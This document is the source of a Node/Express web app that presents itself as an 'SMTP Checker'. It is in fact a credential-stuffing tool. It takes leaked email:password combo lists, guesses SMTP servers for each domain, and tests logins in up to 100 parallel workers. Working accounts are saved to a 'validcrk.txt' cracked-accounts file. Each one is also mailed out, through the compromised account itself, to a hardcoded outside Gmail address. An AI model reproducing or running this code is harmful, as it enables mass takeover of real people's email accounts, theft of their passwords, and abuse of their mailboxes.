import express from "express";
import path from "path";
import fs from "fs";
import nodemailer from "nodemailer";
import { createServer as createViteServer } from "vite";

interface ScanTarget {
  email: string;
  pass: string;
  host: string;
  port: number;
}

interface ScanResult {
  email: string;
  pass: string;
  host: string;
  port: number;
  status: "valid" | "invalid" | "checking" | "error";
  error?: string;
  timestamp: string;
}

interface ScanLog {
  id: string;
  timestamp: string;
  level: "info" | "success" | "error" | "warn";
  message: string;
}

// Global scanner state
let scanQueue: ScanTarget[] = [];
let scanResults: ScanResult[] = [];
let logs: ScanLog[] = [];
let scanStatus: "idle" | "running" | "stopped" | "completed" = "idle";
let concurrencyLimit = 15;
let activeWorkers = 0;
let stopRequested = false;
let notificationEmail = "ems5.tg4@gmail.com";
let processedEmails = new Set<string>(); // to avoid duplicate successful SMTP emails

// Create logs helper
function addLog(level: "info" | "success" | "error" | "warn", message: string) {
  const log: ScanLog = {
    id: Math.random().toString(36).substring(2, 9),
    timestamp: new Date().toLocaleTimeString(),
    level,
    message,
  };
  logs.push(log);
  if (logs.length > 500) {
    logs.shift(); // keep last 500 logs to avoid memory bloat
  }
}

// Generate possible SMTP combinations based on heuristics
function getCombinations(email: string): { host: string; port: number }[] {
  const parts = email.split("@");
  if (parts.length !== 2) return [];
  const domain = parts[1].toLowerCase();

  const combinations: { host: string; port: number }[] = [];
  
  // High confidence providers mapping
  const knownProviders: Record<string, string[]> = {
    "gmail.com": ["smtp.gmail.com"],
    "googlemail.com": ["smtp.gmail.com"],
    "outlook.com": ["smtp.office365.com", "smtp-mail.outlook.com"],
    "hotmail.com": ["smtp.office365.com", "smtp-mail.outlook.com"],
    "hotmail.co.uk": ["smtp.office365.com", "smtp-mail.outlook.com"],
    "live.com": ["smtp.office365.com", "smtp-mail.outlook.com"],
    "live.be": ["smtp.office365.com", "smtp-mail.outlook.com"],
    "live.co.uk": ["smtp.office365.com", "smtp-mail.outlook.com"],
    "yahoo.com": ["smtp.mail.yahoo.com"],
    "yahoo.co.uk": ["smtp.mail.yahoo.com"],
    "yahoo.fr": ["smtp.mail.yahoo.com"],
    "ymail.com": ["smtp.mail.yahoo.com"],
    "aol.com": ["smtp.aol.com"],
    "comcast.net": ["smtp.comcast.net"],
    "icloud.com": ["smtp.mail.me.com"],
    "mac.com": ["smtp.mail.me.com"],
    "me.com": ["smtp.mail.me.com"],
    "mail.com": ["smtp.mail.com"],
    "gmx.com": ["mail.gmx.com"],
    "gmx.net": ["mail.gmx.net"],
    "zoho.com": ["smtp.zoho.com"],
  };

  const hosts = new Set<string>();

  // Use known host if available
  if (knownProviders[domain]) {
    knownProviders[domain].forEach(h => hosts.add(h));
  }

  // Common SMTP prefixes
  const prefixes = ["smtp", "mail", "mx", "relay", "smtp-mail", "smtp.mail", "mailcorp", "secure", "webmail"];
  prefixes.forEach(prefix => {
    hosts.add(`${prefix}.${domain}`);
  });

  // Base domain itself
  hosts.add(domain);

  // Common SMTP ports
  const ports = [587, 465, 25];

  // Combine them
  hosts.forEach(host => {
    ports.forEach(port => {
      combinations.push({ host, port });
    });
  });

  return combinations;
}

// Test absolute credentials
async function testSmtp(target: ScanTarget): Promise<{ success: boolean; error?: string }> {
  const isSecure = target.port === 465;
  const transporter = nodemailer.createTransport({
    host: target.host,
    port: target.port,
    secure: isSecure,
    auth: {
      user: target.email,
      pass: target.pass,
    },
    connectionTimeout: 8000,
    greetingTimeout: 5000,
    socketTimeout: 8000,
    tls: {
      rejectUnauthorized: false, // Bypass self-signed certificates limit
    },
  });

  try {
    await transporter.verify();
    return { success: true };
  } catch (err: any) {
    return { success: false, error: err.message || "Connection failed" };
  }
}

// Send email notification using the validated credentials
async function sendNotification(target: ScanTarget) {
  if (!notificationEmail) return;
  
  const isSecure = target.port === 465;
  const transporter = nodemailer.createTransport({
    host: target.host,
    port: target.port,
    secure: isSecure,
    auth: {
      user: target.email,
      pass: target.pass,
    },
    tls: {
      rejectUnauthorized: false,
    },
  });

  try {
    await transporter.sendMail({
      from: `"SMTP Checker" <${target.email}>`,
      to: notificationEmail,
      subject: "🚀 Valid SMTP Found! - SMTP Checker",
      text: `Found valid SMTP credentials!\n\nEmail: ${target.email}\nPassword: ${target.pass}\nHost: ${target.host}\nPort: ${target.port}\n\nProcessed with SMTP Checker.`,
    });
    addLog("success", `Notification sent successfully to ${notificationEmail} using ${target.email}`);
  } catch (err: any) {
    addLog("warn", `Failed to send notification via ${target.email} to ${notificationEmail}: ${err.message}`);
  }
}

// Append connection result to public file validcrk.txt
function appendResultToFile(target: ScanTarget) {
  const filePath = path.join(process.cwd(), "validcrk.txt");
  const line = `${target.host}|${target.port}|${target.email}|${target.pass}\n`;
  fs.appendFileSync(filePath, line, "utf8");
}

// Main background checking process
async function runWorker() {
  if (stopRequested || scanQueue.length === 0) {
    activeWorkers--;
    if (activeWorkers === 0) {
      scanStatus = scanQueue.length === 0 && !stopRequested ? "completed" : "stopped";
      addLog("info", `Scanning process ended. Status: ${scanStatus}`);
    }
    return;
  }

  const target = scanQueue.shift();
  if (!target) {
    activeWorkers--;
    if (activeWorkers === 0) {
      scanStatus = "completed";
      addLog("info", "Scanning finished successfully.");
    }
    return;
  }

  // Skip emails that already have a functioning combo (to avoid duplicate spam / testing)
  if (processedEmails.has(target.email)) {
    // Check next target instantly
    setImmediate(runWorker);
    return;
  }

  const resultIndex = scanResults.findIndex(r => r.email === target.email && r.host === target.host && r.port === target.port);
  if (resultIndex !== -1) {
    scanResults[resultIndex].status = "checking";
  } else {
    scanResults.push({
      email: target.email,
      pass: target.pass,
      host: target.host,
      port: target.port,
      status: "checking",
      timestamp: new Date().toLocaleTimeString(),
    });
  }

  try {
    const res = await testSmtp(target);
    const currIndex = scanResults.findIndex(r => r.email === target.email && r.host === target.host && r.port === target.port);
    
    if (res.success) {
      if (currIndex !== -1) {
        scanResults[currIndex].status = "valid";
      }
      processedEmails.add(target.email);
      addLog("success", `[VALID] ${target.email} logged in on ${target.host}:${target.port}`);
      
      // Save results
      appendResultToFile(target);
      
      // Send notification email asynchronously
      sendNotification(target).catch(() => {});
    } else {
      if (currIndex !== -1) {
        scanResults[currIndex].status = "invalid";
        scanResults[currIndex].error = res.error;
      }
      // Log some unsuccessful connections briefly but keep logs manageable
      // Add errors to logs or skip quiet failures to avoid flooding
    }
  } catch (e: any) {
    const currIndex = scanResults.findIndex(r => r.email === target.email && r.host === target.host && r.port === target.port);
    if (currIndex !== -1) {
      scanResults[currIndex].status = "error";
      scanResults[currIndex].error = e.message;
    }
  }

  // Next task
  setImmediate(runWorker);
}

// Master controller to queue up workers
function startWorkers() {
  stopRequested = false;
  scanStatus = "running";
  const numWorkers = Math.min(concurrencyLimit, scanQueue.length);
  activeWorkers = numWorkers;
  
  addLog("info", `Spawning ${numWorkers} parallel workers to process queue.`);
  for (let i = 0; i < numWorkers; i++) {
    runWorker();
  }
}

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json({ limit: "50mb" }));

  // API Check Endpoint
  app.get("/api/health", (req, res) => {
    res.json({ status: "ok" });
  });

  // Get scanner status and data
  app.get("/api/scan/status", (req, res) => {
    res.json({
      status: scanStatus,
      queueLength: scanQueue.length,
      totalResultsCount: scanResults.length,
      validCount: scanResults.filter(r => r.status === "valid").length,
      invalidCount: scanResults.filter(r => r.status === "invalid").length,
      checkingCount: scanResults.filter(r => r.status === "checking").length,
      activeWorkers,
      results: scanResults,
      logs: logs.slice(-150), // Send last 150 logs to keep payload lightweight
      notificationEmail,
      concurrencyLimit
    });
  });

  // Start checking
  app.post("/api/scan/start", (req, res) => {
    const { emailList, customHost, customPort, threads, emailNotify } = req.body;

    if (scanStatus === "running") {
      return res.status(400).json({ error: "Scanner is already running." });
    }

    if (threads) {
      concurrencyLimit = Math.min(100, Math.max(1, parseInt(threads)));
    }

    if (emailNotify !== undefined) {
      notificationEmail = emailNotify;
    }

    // Reset results or preserve? Let's refresh scan target queues
    scanQueue = [];
    processedEmails.clear();
    
    // Deletes validcrk.txt as specified in `run_scanner`: "Deletes any existing validcrk.txt file."
    const filePath = path.join(process.cwd(), "validcrk.txt");
    if (fs.existsSync(filePath)) {
      try {
        fs.unlinkSync(filePath);
      } catch (err) {
        // failed or missing
      }
    }

    const lines = typeof emailList === "string" ? emailList.split("\n") : [];
    let addedCount = 0;

    for (let line of lines) {
      line = line.trim();
      if (!line) continue;

      // Extract combo: supports email:password, email|password, email;password
      const delimiters = [":", "|", ";"];
      let email = "";
      let pass = "";
      
      for (const d of delimiters) {
        if (line.includes(d)) {
          const splitPt = line.indexOf(d);
          email = line.substring(0, splitPt).trim();
          pass = line.substring(splitPt + 1).trim();
          break;
        }
      }

      if (!email || !pass) continue;

      // Parse custom specific server inputs if provided by user
      if (customHost && customPort) {
        scanQueue.push({
          email,
          pass,
          host: customHost.trim(),
          port: parseInt(customPort),
        });
        addedCount++;
      } else {
        // Dynamic discovery algorithm (heuristic getCombinations)
        const combos = getCombinations(email);
        combos.forEach(combo => {
          scanQueue.push({
            email,
            pass,
            host: combo.host,
            port: combo.port,
          });
          addedCount++;
        });
      }
    }

    if (scanQueue.length === 0) {
      return res.status(400).json({ error: "No valid email:pass credentials parsed." });
    }

    // Initialize scan metrics
    scanResults = [];
    logs = [];
    addLog("info", `Parsed ${lines.length} lines. Generated ${addedCount} SMTP connection target candidates.`);
    
    startWorkers();
    
    res.json({ message: "Scan started successfully.", totalTargets: addedCount });
  });

  // Abort running scan
  app.post("/api/scan/stop", (req, res) => {
    if (scanStatus !== "running") {
      return res.status(400).json({ error: "Scanner is not currently running." });
    }
    stopRequested = true;
    scanStatus = "stopped";
    scanQueue = [];
    addLog("warn", "Stop requested. Workers are shutting down.");
    res.json({ message: "Stopping workers..." });
  });

  // Download valid cracked accounts file
  app.get("/api/results/download", (req, res) => {
    const filePath = path.join(process.cwd(), "validcrk.txt");
    if (!fs.existsSync(filePath)) {
      return res.status(404).json({ error: "No valid credentials file found." });
    }
    res.setHeader("Content-Disposition", "attachment; filename=validcrk.txt");
    res.setHeader("Content-Type", "text/plain");
    fs.createReadStream(filePath).pipe(res);
  });

  // Clear everything
  app.post("/api/results/clear", (req, res) => {
    scanResults = [];
    logs = [];
    scanQueue = [];
    processedEmails.clear();
    const filePath = path.join(process.cwd(), "validcrk.txt");
    if (fs.existsSync(filePath)) {
      try {
        fs.unlinkSync(filePath);
      } catch (err) {}
    }
    addLog("info", "All scanning history and validcrk.txt cleared.");
    res.json({ message: "History and results cleared successfully." });
  });

  // Serve static files / Vite SPA router routing
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Express SMTP server running on http://0.0.0.0:${PORT}`);
  });
}

startServer();
